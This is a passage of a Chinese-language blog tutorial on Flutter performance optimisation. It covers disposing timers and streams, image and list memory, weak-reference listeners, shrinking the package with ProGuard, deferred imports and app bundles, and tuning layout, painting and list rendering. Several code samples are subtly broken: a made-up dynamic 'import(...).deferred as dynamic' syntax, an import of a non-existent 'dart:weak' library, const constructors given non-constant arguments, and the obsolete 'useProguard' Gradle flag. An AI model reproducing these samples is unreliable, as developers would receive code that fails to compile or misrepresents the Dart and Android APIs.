    _timer = Timer.periodic(<span class="hljs-built_in">Duration</span>(seconds: <span class="hljs-number">2</span>), (_) =&gt; <span class="hljs-built_in">print</span>(<span class="hljs-string">'timer'</span>));
    
    <span class="hljs-comment">// 添加监听器</span>
    _controller.addListener(() =&gt; <span class="hljs-built_in">print</span>(<span class="hljs-string">'scrolling'</span>));
  }
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> dispose() {
    <span class="hljs-comment">// 忘记取消和释放</span>
    <span class="hljs-comment">// _subscription?.cancel();</span>
    <span class="hljs-comment">// _timer?.cancel();</span>
    <span class="hljs-comment">// _controller.dispose();</span>
    
    <span class="hljs-keyword">super</span>.dispose();
  }
}

<span class="hljs-comment">// 正确做法：</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SafeWidget</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  _SafeWidgetState createState() =&gt; _SafeWidgetState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_SafeWidgetState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">SafeWidget</span>&gt; </span>{
  <span class="hljs-keyword">late</span> <span class="hljs-keyword">final</span> StreamSubscription _subscription;
  <span class="hljs-keyword">late</span> <span class="hljs-keyword">final</span> Timer _timer;
  <span class="hljs-keyword">late</span> <span class="hljs-keyword">final</span> ScrollController _controller;
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> initState() {
    <span class="hljs-keyword">super</span>.initState();
    
    _controller = ScrollController();
    _controller.addListener(_onScroll);
    
    _subscription = Stream.periodic(<span class="hljs-built_in">Duration</span>(seconds: <span class="hljs-number">1</span>))
        .listen(_onTick);
    
    _timer = Timer.periodic(<span class="hljs-built_in">Duration</span>(seconds: <span class="hljs-number">2</span>), _onTimer);
  }
  
  <span class="hljs-keyword">void</span> _onTick(_) =&gt; <span class="hljs-built_in">print</span>(<span class="hljs-string">'tick'</span>);
  <span class="hljs-keyword">void</span> _onTimer(_) =&gt; <span class="hljs-built_in">print</span>(<span class="hljs-string">'timer'</span>);
  <span class="hljs-keyword">void</span> _onScroll() =&gt; <span class="hljs-built_in">print</span>(<span class="hljs-string">'scrolling'</span>);
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> dispose() {
    <span class="hljs-comment">// 按创建顺序的逆序释放</span>
    _timer.cancel();
    _subscription.cancel();
    _controller.dispose();
    
    <span class="hljs-keyword">super</span>.dispose();
  }
}
</code></pre>
<h4 data-id="heading-10">优化手段2：大对象管理</h4>
<p><strong>是什么</strong>：针对图像、列表等大内存对象进行特殊管理。</p>
<p><strong>为什么重要</strong>：</p>
<ul>
<li>图像是移动应用内存的最大占用者</li>
<li>不当的图像加载会导致OOM</li>
<li>列表数据可能占用大量内存</li>
</ul>
<p><strong>优化策略</strong>：</p>
<ol>
<li>图像压缩和缓存</li>
<li>列表分页加载</li>
<li>对象池复用</li>
<li>懒加载和预加载平衡</li>
</ol>
<p><strong>怎么做</strong>：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 优化图像内存</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ImageMemoryOptimizer</span> </span>{
  <span class="hljs-comment">// 1. 使用正确的图像尺寸</span>
  <span class="hljs-keyword">static</span> Widget buildOptimizedImage(<span class="hljs-built_in">String</span> url) {
    <span class="hljs-keyword">return</span> Image.network(
      url,
      width: <span class="hljs-number">100</span>,  
      height: <span class="hljs-number">100</span>,
      fit: BoxFit.cover,
      cacheWidth: <span class="hljs-number">200</span>,  
      cacheHeight: <span class="hljs-number">200</span>,
    );
  }
  
  <span class="hljs-comment">// 2. 使用缓存策略</span>
  <span class="hljs-keyword">static</span> Widget buildCachedImage(<span class="hljs-built_in">String</span> url) {
    <span class="hljs-keyword">return</span> CachedNetworkImage(
      imageUrl: url,
      placeholder: (context, url) =&gt; CircularProgressIndicator(),
      errorWidget: (context, url, error) =&gt; Icon(Icons.error),
      width: <span class="hljs-number">100</span>,
      height: <span class="hljs-number">100</span>,
      fit: BoxFit.cover,
      memCacheWidth: <span class="hljs-number">200</span>,  
      memCacheHeight: <span class="hljs-number">200</span>,
      maxWidthDiskCache: <span class="hljs-number">400</span>,  
      maxHeightDiskCache: <span class="hljs-number">400</span>,
    );
  }
  
  <span class="hljs-comment">// 3. 管理图片预加载</span>
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, ImageProvider&gt; _preloadedImages = {};
  
  <span class="hljs-keyword">static</span> Future&lt;<span class="hljs-keyword">void</span>&gt; preloadImage(<span class="hljs-built_in">String</span> url) <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">if</span> (_preloadedImages.containsKey(url)) <span class="hljs-keyword">return</span>;
    
    <span class="hljs-keyword">final</span> completer = Completer&lt;<span class="hljs-keyword">void</span>&gt;();
    <span class="hljs-keyword">final</span> imageProvider = NetworkImage(url);
    
    <span class="hljs-comment">// 预加载到缓存</span>
    <span class="hljs-keyword">final</span> stream = imageProvider.resolve(ImageConfiguration.empty);
    <span class="hljs-keyword">final</span> listener = ImageStreamListener((info, <span class="hljs-keyword">sync</span>) {
      _preloadedImages[url] = imageProvider;
      completer.complete();
    });
    
    stream.addListener(listener);
    <span class="hljs-keyword">await</span> completer.future;
    stream.removeListener(listener);
  }
}

<span class="hljs-comment">// 优化列表内存</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ListMemoryOptimizer</span> </span>{
  <span class="hljs-comment">// 1. 分页加载</span>
  <span class="hljs-keyword">static</span> Future&lt;<span class="hljs-built_in">List</span>&lt;Item&gt;&gt; loadItems(<span class="hljs-built_in">int</span> page, <span class="hljs-built_in">int</span> pageSize) <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">final</span> start = page * pageSize;
    <span class="hljs-keyword">final</span> end = start + pageSize;
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> _fetchItems(start, end);
  }
  
  <span class="hljs-comment">// 2. 重用列表项</span>
  <span class="hljs-keyword">static</span> Widget buildReusableListItem(Item item) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">const</span> ReusableListItem(item: item);
  }
}
</code></pre>
<h4 data-id="heading-11">优化手段3：WeakReference使用</h4>
<p><strong>是什么</strong>：弱引用允许对象被垃圾回收，即使还有引用指向它。</p>
<p><strong>为什么重要</strong>：</p>
<ul>
<li>打破循环引用</li>
<li>避免因监听器导致的内存泄漏</li>
<li>允许缓存被自动清理</li>
</ul>
<p><strong>适用场景</strong>：</p>
<ul>
<li>事件监听器</li>
<li>缓存实现</li>
<li>观察者模式</li>
</ul>
<p><strong>怎么做</strong>：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 使用弱引用的事件管理器</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'dart:weak'</span>;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EventManager</span> </span>{
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">List</span>&lt;WeakReference&lt;EventListener&gt;&gt; _listeners = [];
  
  <span class="hljs-keyword">void</span> addListener(EventListener listener) {
    _listeners.add(WeakReference(listener));
  }
  
  <span class="hljs-keyword">void</span> notify(<span class="hljs-built_in">String</span> event) {
    <span class="hljs-comment">// 清理被回收的监听器</span>
    _listeners.removeWhere((ref) =&gt; ref.target == <span class="hljs-keyword">null</span>);
    
    <span class="hljs-comment">// 通知存活的监听器</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">final</span> ref <span class="hljs-keyword">in</span> _listeners) {
      ref.target?.onEvent(event);
    }
  }
}

<span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EventListener</span> </span>{
  <span class="hljs-keyword">void</span> onEvent(<span class="hljs-built_in">String</span> event);
}

<span class="hljs-comment">// 具体使用</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyWidget</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  _MyWidgetState createState() =&gt; _MyWidgetState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_MyWidgetState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">MyWidget</span>&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title">EventListener</span> </span>{
  <span class="hljs-keyword">late</span> <span class="hljs-keyword">final</span> EventManager _eventManager;
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> initState() {
    <span class="hljs-keyword">super</span>.initState();
    _eventManager = EventManager();
    _eventManager.addListener(<span class="hljs-keyword">this</span>); 
  }
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> onEvent(<span class="hljs-built_in">String</span> event) {
    <span class="hljs-keyword">if</span> (mounted) {
      setState(() {
        <span class="hljs-comment">// 处理事件...</span>
      });
    }
  }
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> dispose() {
    <span class="hljs-comment">// 不需要手动移除监听器</span>
    <span class="hljs-keyword">super</span>.dispose();
  }
}
</code></pre>
<h3 data-id="heading-12">三、优化包体积</h3>
<h4 data-id="heading-13">包体积为什么重要？</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[包体积过大的影响] --&gt; B[下载量下降]
    A --&gt; C[存储空间占用]
    A --&gt; D[更新频率降低]
    A --&gt; E[低端设备体验差]
    
    F[体积构成分析] --&gt; G[第一位:资源文件]
    F --&gt; H[第二位:Flutter引擎]
    F --&gt; I[第三位:Dart代码]
    F --&gt; J[第四位:三方库]
</code></pre>
<h4 data-id="heading-14">优化手段1：优化资源文件</h4>
<p><strong>是什么</strong>：减少图片、字体等资源文件的大小。</p>
<p><strong>为什么重要</strong>：</p>
<ul>
<li>资源文件通常占用最大体积</li>
<li>未使用的资源白白占用空间</li>
<li>未优化的资源加载慢</li>
</ul>
<p><strong>优化手段</strong>：</p>
<ol>
<li>删除未使用资源</li>
<li>压缩图片格式</li>
<li>字体子集化</li>
<li>按需加载大资源</li>
</ol>
<p><strong>怎么做</strong>：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># pubspec.yaml优化示例</span>
<span class="hljs-attr">flutter:</span>
  <span class="hljs-attr">assets:</span>
    <span class="hljs-comment"># 不要导入整个目录</span>
    <span class="hljs-comment"># - assets/images/</span>
    
    <span class="hljs-comment"># 精确指定需要的文件</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">assets/images/icon.png</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">assets/images/logo.png</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">assets/images/splash.png</span>
    
    <span class="hljs-comment"># 使用WebP格式</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">assets/images/background.webp</span>
    
  <span class="hljs-attr">fonts:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">family:</span> <span class="hljs-string">NotoSans</span>
      <span class="hljs-attr">fonts:</span>
        <span class="hljs-bullet">-</span> <span class="hljs-attr">asset:</span> <span class="hljs-string">assets/fonts/NotoSans-Regular.ttf</span>
          <span class="hljs-comment"># 只包含需要的字体</span>
          <span class="hljs-comment"># - asset: assets/fonts/NotoSans-Bold.ttf</span>
          <span class="hljs-comment">#   weight: 700</span>
</code></pre>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 资源优化常用的终端命令：</span>
<span class="hljs-comment"># 1. 查找大文件</span>
find . -name <span class="hljs-string">"*.png"</span> -size +100k -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -lh {} \;

<span class="hljs-comment"># 2. 转换为WebP</span>
cwebp -q 80 input.png -o output.webp

<span class="hljs-comment"># 3. 字体子集化</span>
pyftsubset font.ttf --text-file=chinese_chars.txt
</code></pre>
<h4 data-id="heading-15">优化手段2：代码混淆</h4>
<p><strong>是什么</strong>：通过混淆、压缩和优化减少代码体积。</p>
<p><strong>为什么重要</strong>：</p>
<ul>
<li>移除未使用的代码</li>
<li>缩短标识符名称</li>
<li>优化控制流</li>
</ul>
<p><strong>优化工具</strong>：</p>
<ol>
<li>R8/ProGuard（Android）</li>
<li>Dart编译优化</li>
<li>Tree Shaking</li>
</ol>
<p><strong>怎么做</strong>：</p>
<pre><code class="hljs language-gradle" lang="gradle">// android/app/build.gradle
android {
    buildTypes {
        release {
            // 启用代码优化
            minifyEnabled true
            shrinkResources true
            
            // 使用R8
            useProguard true
            
            proguardFiles getDefaultProguardFile(
                'proguard-android-optimize.txt'
            ), 'proguard-rules.pro'
        }
    }
}
</code></pre>
<pre><code class="hljs language-pro" lang="pro"># proguard-rules.pro
# 保留Flutter必要类
-keep class io.flutter.app.** { *; }
-keep class io.flutter.plugin.** { *; }

# 移除日志
-assumenosideeffects class android.util.Log {
    public static *** d(...);
    public static *** i(...);
    public static *** w(...);
    public static *** e(...);
}
</code></pre>
<h4 data-id="heading-16">优化手段3：按需加载与延迟导入</h4>
<p><strong>是什么</strong>：将应用拆分为多个模块，按需加载。</p>
<p><strong>为什么重要</strong>：</p>
<ul>
<li>减少初始加载体积</li>
<li>节省用户流量，提高启动速度</li>
</ul>
<p><strong>实现方式</strong>：</p>
<ol>
<li>deferred import</li>
<li>动态特性模块</li>
<li>代码分割</li>
</ol>
<p><strong>怎么做</strong>：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 延迟导入</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:heavy_library/heavy_library.dart'</span> <span class="hljs-keyword">deferred</span> <span class="hljs-keyword">as</span> heavy;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LazyLoadWidget</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  _LazyLoadWidgetState createState() =&gt; _LazyLoadWidgetState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_LazyLoadWidgetState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">LazyLoadWidget</span>&gt; </span>{
  <span class="hljs-built_in">bool</span> _isLoaded = <span class="hljs-keyword">false</span>;
  
  Future&lt;<span class="hljs-keyword">void</span>&gt; _loadLibrary() <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">await</span> heavy.loadLibrary();
    setState(() =&gt; _isLoaded = <span class="hljs-keyword">true</span>);
  }
  
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">if</span> (!_isLoaded) {
      <span class="hljs-keyword">return</span> ElevatedButton(
        onPressed: _loadLibrary,
        child: <span class="hljs-keyword">const</span> Text(<span class="hljs-string">'加载功能模块'</span>),
      );
    }
    
    <span class="hljs-keyword">return</span> heavy.HeavyWidget();
  }
}

<span class="hljs-comment">// 动态特性加载</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FeatureManager</span> </span>{
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">dynamic</span>&gt; _loadedFeatures = {};
  
  <span class="hljs-keyword">static</span> Future&lt;<span class="hljs-built_in">dynamic</span>&gt; loadFeature(<span class="hljs-built_in">String</span> featureName) <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">if</span> (_loadedFeatures.containsKey(featureName)) {
      <span class="hljs-keyword">return</span> _loadedFeatures[featureName];
    }
    
    <span class="hljs-keyword">switch</span> (featureName) {
      <span class="hljs-keyword">case</span> <span class="hljs-string">'payment'</span>:
        <span class="hljs-keyword">final</span> payment = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'package:app/payment.dart'</span>)
            .<span class="hljs-keyword">deferred</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">dynamic</span>;
        _loadedFeatures[featureName] = payment;
        <span class="hljs-keyword">return</span> payment;
        
      <span class="hljs-keyword">case</span> <span class="hljs-string">'analytics'</span>:
        <span class="hljs-comment">// 按需加载分析模块</span>
        <span class="hljs-keyword">final</span> analytics = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'package:app/analytics.dart'</span>)
            .<span class="hljs-keyword">deferred</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">dynamic</span>;
        _loadedFeatures[featureName] = analytics;
        <span class="hljs-keyword">return</span> analytics;
    }
    
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;
  }
}
</code></pre>
<h4 data-id="heading-17">优化手段4：优化应用Bundle</h4>
<p><strong>是什么</strong>：利用平台特性进行智能分发。</p>
<p><strong>为什么重要</strong>：</p>
<ul>
<li>Android App Bundle减少下载体积</li>
<li>iOS App Thinning按设备分发</li>
<li>支持动态功能模块</li>
</ul>
<p><strong>实现方式</strong>：</p>
<ol>
<li>Android App Bundle</li>
<li>iOS App Thinning</li>
<li>动态功能交付</li>
</ol>
<p><strong>怎么做</strong>：</p>
<pre><code class="hljs language-gradle" lang="gradle">// 启用Android App Bundle
android {
    bundle {
        language {
            enableSplit = true  // 按语言拆分
        }
        density {
            enableSplit = true  // 按屏幕密度拆分
        }
        abi {
            enableSplit = true  // 按CPU架构拆分
        }
    }
}
</code></pre>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 构建命令</span>
<span class="hljs-comment"># 1. 构建Android App Bundle</span>
flutter build appbundle

<span class="hljs-comment"># 2. 分析Bundle</span>
flutter build appbundle --target-platform android-arm64 --analyze-size

<span class="hljs-comment"># 3. 测试Bundle</span>
bundletool build-apks --bundle=app.aab --output=app.apks
bundletool install-apks --apks=app.apks
</code></pre>
<h3 data-id="heading-18">四、优化渲染性能</h3>
<h4 data-id="heading-19">什么导致了渲染卡顿？</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    A[渲染卡顿原因] --&gt; B[复杂布局计算]
    A --&gt; C[频繁绘制操作]
    A --&gt; D[图层合成开销]
    A --&gt; E[GPU负载过高]
    
    B --&gt; F[嵌套过深]
    B --&gt; G[约束传递频繁]
    
    C --&gt; H[过度使用阴影]
    C --&gt; I[透明度处理不当]
    C --&gt; J[频繁裁剪操作]
    
    D --&gt; K[RepaintBoundary过多]
    D --&gt; L[图层混合模式复杂]
</code></pre>
<h4 data-id="heading-20">优化手段1：优化布局性能</h4>
<p><strong>是什么</strong>：减少布局计算的时间和复杂度。</p>
<p><strong>为什么重要</strong>：</p>
<ul>
<li>布局是渲染管线中最耗时的阶段之一</li>
<li>复杂的布局导致界面卡顿</li>
<li>不当的约束传递引发连锁重排</li>
</ul>
<p><strong>优化手段</strong>：</p>
<ol>
<li>减少Widget嵌套深度</li>
<li>使用合适的布局Widget</li>
<li>避免过度使用Flexible/Expanded</li>
<li>使用CustomSingleChildLayout/CustomMultiChildLayout</li>
</ol>
<p><strong>怎么做</strong>：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 不推荐：深度嵌套</span>
Widget buildBadLayout() {
  <span class="hljs-keyword">return</span> Container(
    child: Column(
      children: [
        Container(
          child: Row(
            children: [
              Container(child: Text(<span class="hljs-string">'A'</span>)),
              Container(child: Text(<span class="hljs-string">'B'</span>)),
              Container(child: Text(<span class="hljs-string">'C'</span>)),
            ],
          ),
        ),
        <span class="hljs-comment">// 更多嵌套...</span>
      ],
    ),
  );
}

<span class="hljs-comment">// 优化的布局</span>
Widget buildGoodLayout() {
  <span class="hljs-keyword">return</span> Column(
    children: [
      Row(
        children: <span class="hljs-keyword">const</span> [
          Text(<span class="hljs-string">'A'</span>),
          SizedBox(width: <span class="hljs-number">8</span>),
          Text(<span class="hljs-string">'B'</span>),
          SizedBox(width: <span class="hljs-number">8</span>),
          Text(<span class="hljs-string">'C'</span>),
        ],
      ),
      <span class="hljs-comment">// 使用间隔Widget替代多余的Container</span>
      <span class="hljs-keyword">const</span> SizedBox(height: <span class="hljs-number">16</span>),
    ],
  );
}

<span class="hljs-comment">// 使用CustomMultiChildLayout优化复杂布局</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OptimizedLayout</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> CustomMultiChildLayout(
      delegate: _LayoutDelegate(),
      children: [
        LayoutId(
          id: _LayoutItem.header,
          child: <span class="hljs-keyword">const</span> HeaderWidget(),
        ),
        LayoutId(
          id: _LayoutItem.content,
          child: <span class="hljs-keyword">const</span> ContentWidget(),
        ),
        LayoutId(
          id: _LayoutItem.footer,
          child: <span class="hljs-keyword">const</span> FooterWidget(),
        ),
      ],
    );
  }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_LayoutDelegate</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">MultiChildLayoutDelegate</span> </span>{
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> performLayout(Size size) {
    <span class="hljs-comment">// 一次性计算所有子项的位置和大小</span>
    <span class="hljs-keyword">final</span> headerSize = layoutChild(
      _LayoutItem.header,
      BoxConstraints.loose(size),
    );
    
    <span class="hljs-keyword">final</span> footerSize = layoutChild(
      _LayoutItem.footer,
      BoxConstraints.loose(size),
    );
    
    <span class="hljs-keyword">final</span> contentConstraints = BoxConstraints(
      maxWidth: size.width,
      maxHeight: size.height - headerSize.height - footerSize.height,
    );
    
    layoutChild(_LayoutItem.content, contentConstraints);
    
    <span class="hljs-comment">// 定位子项</span>
    positionChild(_LayoutItem.header, Offset.zero);
    positionChild(_LayoutItem.content, Offset(<span class="hljs-number">0</span>, headerSize.height));
    positionChild(_LayoutItem.footer, 
        Offset(<span class="hljs-number">0</span>, size.height - footerSize.height));
  }
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-built_in">bool</span> shouldRelayout(<span class="hljs-keyword">covariant</span> MultiChildLayoutDelegate oldDelegate) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
  }
}

<span class="hljs-keyword">enum</span> _LayoutItem { header, content, footer }
</code></pre>
<h4 data-id="heading-21">优化手段2：优化绘制性能</h4>
<p><strong>是什么</strong>：减少复杂绘制操作频率。</p>
<p><strong>为什么重要</strong>：</p>
<ul>
<li>复杂的绘制操作消耗GPU资源</li>
<li>过度绘制浪费渲染时间</li>
<li>不当的效果使用导致性能变差</li>
</ul>
<p><strong>优化策略</strong>：</p>
<ol>
<li>避免过度使用阴影</li>
<li>谨慎使用透明度</li>
<li>减少裁剪操作</li>
<li>使用缓存图片</li>
</ol>
<p><strong>怎么做</strong>：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 优化绘制</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PaintOptimization</span> </span>{
  <span class="hljs-comment">// 1. 优化阴影</span>
  <span class="hljs-keyword">static</span> BoxDecoration optimizedShadow() {
    <span class="hljs-keyword">return</span> BoxDecoration(
      color: Colors.white,
      borderRadius: BorderRadius.circular(<span class="hljs-number">8</span>),
      <span class="hljs-comment">// 过度使用阴影</span>
      <span class="hljs-comment">// boxShadow: [</span>
      <span class="hljs-comment">//   BoxShadow(color: Colors.black12, blurRadius: 16),</span>
      <span class="hljs-comment">//   BoxShadow(color: Colors.black12, blurRadius: 8),</span>
      <span class="hljs-comment">//   BoxShadow(color: Colors.black12, blurRadius: 4),</span>
      <span class="hljs-comment">// ],</span>
      
      <span class="hljs-comment">// 优化后</span>
      boxShadow: <span class="hljs-keyword">const</span> [
        BoxShadow(
          color: Colors.black12,
          blurRadius: <span class="hljs-number">4</span>,
          spreadRadius: <span class="hljs-number">0</span>,
          offset: Offset(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>),
        ),
      ],
    );
  }
  
  <span class="hljs-comment">// 2. 优化透明度</span>
  <span class="hljs-keyword">static</span> Widget optimizedOpacity() {
    <span class="hljs-comment">// 使用Opacity Widget</span>
    <span class="hljs-comment">// return Opacity(</span>
    <span class="hljs-comment">//   opacity: 0.5,</span>
    <span class="hljs-comment">//   child: Container(color: Colors.blue),</span>
    <span class="hljs-comment">// );</span>
    
    <span class="hljs-comment">// 使用颜色透明度</span>
    <span class="hljs-keyword">return</span> Container(
      color: Colors.blue.withOpacity(<span class="hljs-number">0.5</span>),
    );
    
    <span class="hljs-comment">// 对于静态半透明，使用ColorFiltered</span>
    <span class="hljs-comment">// return ColorFiltered(</span>
    <span class="hljs-comment">//   colorFilter: ColorFilter.mode(</span>
    <span class="hljs-comment">//     Colors.white.withOpacity(0.5),</span>
    <span class="hljs-comment">//     BlendMode.modulate,</span>
    <span class="hljs-comment">//   ),</span>
    <span class="hljs-comment">//   child: Container(color: Colors.blue),</span>
    <span class="hljs-comment">// );</span>
  }
  
  <span class="hljs-comment">// 3. 优化裁剪</span>
  <span class="hljs-keyword">static</span> Widget optimizedClip() {
    <span class="hljs-comment">// 复杂裁剪</span>
    <span class="hljs-comment">// return ClipPath(</span>
    <span class="hljs-comment">//   clipper: ComplexClipper(),</span>
    <span class="hljs-comment">//   child: Container(color: Colors.blue),</span>
    <span class="hljs-comment">// );</span>
    
    <span class="hljs-comment">// 简单裁剪</span>
    <span class="hljs-keyword">return</span> ClipRRect(
      borderRadius: BorderRadius.circular(<span class="hljs-number">8</span>),
      child: Container(color: Colors.blue),
    );
    
    <span class="hljs-comment">// 使用装饰而不是裁剪</span>
    <span class="hljs-comment">// return Container(</span>
    <span class="hljs-comment">//   decoration: BoxDecoration(</span>
    <span class="hljs-comment">//     color: Colors.blue,</span>
    <span class="hljs-comment">//     borderRadius: BorderRadius.circular(8),</span>
    <span class="hljs-comment">//   ),</span>
    <span class="hljs-comment">// );</span>
  }
}
</code></pre>
<h4 data-id="heading-22">优化手段3：优化列表性能</h4>
<p><strong>是什么</strong>：针对ListView、GridView等可滚动组件进行优化。</p>
<p><strong>为什么重要</strong>：</p>
<ul>
<li>几乎所有的应用都会用到列表组件，他的性能好坏直接影响用户体验</li>
<li>不当的列表实现导致滚动卡顿</li>
</ul>
<p><strong>优化策略</strong>：</p>
<ol>
<li>使用正确的ListView构造函数</li>
<li>设置合理的缓存范围</li>
<li>优化列表项构建</li>
<li>使用Sliver系列组件</li>
</ol>
<p><strong>怎么做</strong>：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ListOptimization</span> </span>{
  <span class="hljs-comment">// 1. 选择合适的ListView构造函数</span>
  <span class="hljs-keyword">static</span> Widget buildOptimizedList(<span class="hljs-built_in">List</span>&lt;Item&gt; items) {
    <span class="hljs-keyword">return</span> ListView.builder(
      itemCount: items.length,
      
      <span class="hljs-comment">// 优化参数</span>
      addAutomaticKeepAlives: <span class="hljs-keyword">false</span>, <span class="hljs-comment">// 手动控制状态保持</span>
      addRepaintBoundaries: <span class="hljs-keyword">true</span>,   
      
      <span class="hljs-comment">// 缓存范围，预渲染区域</span>
      cacheExtent: <span class="hljs-number">1000</span>, <span class="hljs-comment">// 默认250，增大可减少滚动卡顿</span>
      
      <span class="hljs-comment">// 如果item高度固定，使用itemExtent提高性能</span>
      <span class="hljs-comment">// itemExtent: 100,</span>
      
      <span class="hljs-comment">// 或者使用prototypeItem</span>
      <span class="hljs-comment">// prototypeItem: const ListTile(title: Text('原型')),</span>
      
      itemBuilder: (context, index) {
        <span class="hljs-keyword">return</span> _buildOptimizedItem(items[index]);
      },
    );
  }
  
  <span class="hljs-comment">// 2. 优化列表项构建</span>
  <span class="hljs-keyword">static</span> Widget _buildOptimizedItem(Item item) {
    <span class="hljs-keyword">return</span> RepaintBoundary(
      child: KeepAlive(
        keepAlive: _shouldKeepAlive(item),
        child: <span class="hljs-keyword">const</span> OptimizedListItem(item: item),
      ),
    );
  }
  
  <span class="hljs-keyword">static</span> <span class="hljs-built_in">bool</span> _shouldKeepAlive(Item item) {
    <span class="hljs-keyword">return</span> item.isImportant;
  }
  
  <span class="hljs-comment">// 3. 使用CustomScrollView和Slivers</span>
  <span class="hljs-keyword">static</span> Widget buildCustomScrollView() {
    <span class="hljs-keyword">return</span> CustomScrollView(
      slivers: [
        <span class="hljs-comment">// 固定AppBar</span>
        <span class="hljs-keyword">const</span> SliverAppBar(pinned: <span class="hljs-keyword">true</span>, expandedHeight: <span class="hljs-number">200</span>),
        
        <span class="hljs-comment">// 固定Header</span>
        <span class="hljs-keyword">const</span> SliverToBoxAdapter(
          child: Padding(
            padding: EdgeInsets.all(<span class="hljs-number">16</span>),
            child: Text(<span class="hljs-string">'商品列表'</span>),
          ),
        ),
        
        <span class="hljs-comment">// 使用SliverFixedExtentList</span>
        SliverFixedExtentList(
          itemExtent: <span class="hljs-number">100</span>, 
          delegate: SliverChildBuilderDelegate(
            (context, index) =&gt; _buildOptimizedItem(_getItem(index)),
            childCount: <span class="hljs-number">1000</span>,
          ),
        ),
      ],
    );
  }
}
</code></pre>
<h4 data-id="heading-23">优化手段4：优化动画性能</h4>
<p><strong>是什么</strong>：优化动画的流畅度和性能。</p>
<p><strong>为什么重要</strong>：</p>
<ul>
<li>动画流畅度是用户体验的最直观感受，复杂的动画会消耗大量资源，也会导致卡顿</li>
</ul>
<p><strong>优化策略</strong>：</p>
<ol>
<li>使用AnimatedWidget/AnimatedBuilder</li>
